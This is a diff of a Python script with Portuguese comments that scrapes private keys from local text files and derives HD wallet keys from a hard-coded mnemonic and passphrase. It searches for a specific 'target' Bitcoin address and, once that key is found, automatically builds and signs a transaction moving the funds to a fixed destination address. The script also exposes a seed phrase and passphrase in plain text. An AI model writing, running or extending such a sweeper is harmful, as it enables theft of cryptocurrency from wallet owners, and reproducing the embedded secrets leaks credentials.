@@ -6,71 +6,72 @@ from bitcoinlib.transactions import Transaction
 
 # --- CONFIGURAÇÕES ---
 TARGET_ADDRESS = "1HYfivTqoSzjqy6eawyitWoK8HvigtU3yb"
-PASSWORD = "Benjamin2020*1981$" # Esta é a sua "Salt" do BIP39
+PASSWORD = "Benjamin2020*1981$"
 DEST_ADDRESS = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
 
-def scan_final_v28():
+def scan_optimized():
     all_keys = []
     
-    # 1. Fontes de Arquivo
+    # 1. Extração de Arquivos (Mesma lógica)
     files = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']
     for f in files:
         try:
             with open(f, 'r', encoding='utf-8', errors='ignore') as file:
                 content = file.read()
-                # Busca WIFs e Hexadecimais
-                found = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
-                found.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
-                if found:
-                    print(f"Sucesso: {len(found)} chaves de {f}")
-                    all_keys.extend(found)
-        except Exception: continue
+                all_keys.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
+                all_keys.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
+        except: continue
 
-    # 2. Derivação HD Corrigida
+    # 2. Derivação HD (Foco em Performance)
     try:
         mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
-        print(f"Derivando caminhos com a Passphrase...")
-        
-        # Criando a Master Key a partir do Mnemonic + Passphrase (Salt)
         master = HDKey.from_passphrase(mnemonic, salt=PASSWORD, network='bitcoin')
         
-        for i in range(200): # Aumentei o range para 200
-            # Adicionando caminhos Legacy, SegWit e Native SegWit
-            paths = [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]
-            for path in paths:
-                derived_key = master.subkey_for_path(path)
-                all_keys.append(derived_key.wif())
+        # Geramos as chaves primeiro
+        for i in range(500): # Aumentado para 500 já que é rápido
+            for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
+                all_keys.append(master.subkey_for_path(path).wif())
     except Exception as e:
-        print(f"Erro na derivação: {e}")
+        print(f"Erro derivação: {e}")
 
     all_keys = list(set(all_keys))
-    print(f"Iniciando varredura em {len(all_keys)} chaves...")
+    print(f"Varrendo {len(all_keys)} chaves localmente...")
 
+    # 3. Loop de Verificação Ultrarápido
     for wif in all_keys:
         try:
-            # Testar formatos Comprimidos e Não-Comprimidos
             for is_compressed in [True, False]:
                 k = Key(wif, network='bitcoin', compressed=is_compressed)
                 
-                # O endereço alvo '1HYfi' é Legacy (P2PKH)
-                addr = k.address() 
+                # TESTE LOCAL (Não gasta internet/tempo)
+                addr = k.address()
                 
                 if addr == TARGET_ADDRESS:
-                    print(f"!!! ALVO DETECTADO: {addr} !!!")
-                    print(f"WIF: {wif} | Comprimida: {is_compressed}")
-
-                # Verificação de Saldo via API
-                r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
-                if r.status_code == 200 and r.json():
-                    utxos = r.json()
-                    total_balance = sum(u['value'] for u in utxos)
-                    print(f"!!! SALDO ENCONTRADO EM {addr}: {total_balance} sats !!!")
+                    print(f"\n!!! ALVO ENCONTRADO: {addr} !!!")
+                    print(f"WIF: {wif}")
                     
-                    # Lógica de Transação (Opcional automatizar aqui ou apenas exibir o HEX)
-                    # ... (seu código de transação aqui)
-            
-        except Exception:
-            continue
+                    # SÓ AGORA consultamos a API para pegar o UTXO e transmitir
+                    check_and_broadcast(addr, wif)
+                    return # Para após encontrar
+                    
+        except: continue
+
+def check_and_broadcast(addr, wif):
+    print(f"Consultando saldo para {addr}...")
+    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo")
+    if r.status_code == 200 and r.json():
+        utxos = r.json()
+        utxo = max(utxos, key=lambda x: x['value'])
+        amount = utxo['value'] - 5000 # Taxa de minerador (ajustável)
+        
+        tx = Transaction(network='bitcoin')
+        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
+        tx.add_output(value=amount, address=DEST_ADDRESS)
+        tx.sign([wif])
+        
+        hex_tx = tx.raw_hex()
+        print(f"HEX_GEN:{hex_tx}")
+        # O seu script shell viaBTC cuidará do resto!
 
 if __name__ == "__main__":
-    scan_final_v28()
+    scan_optimized()
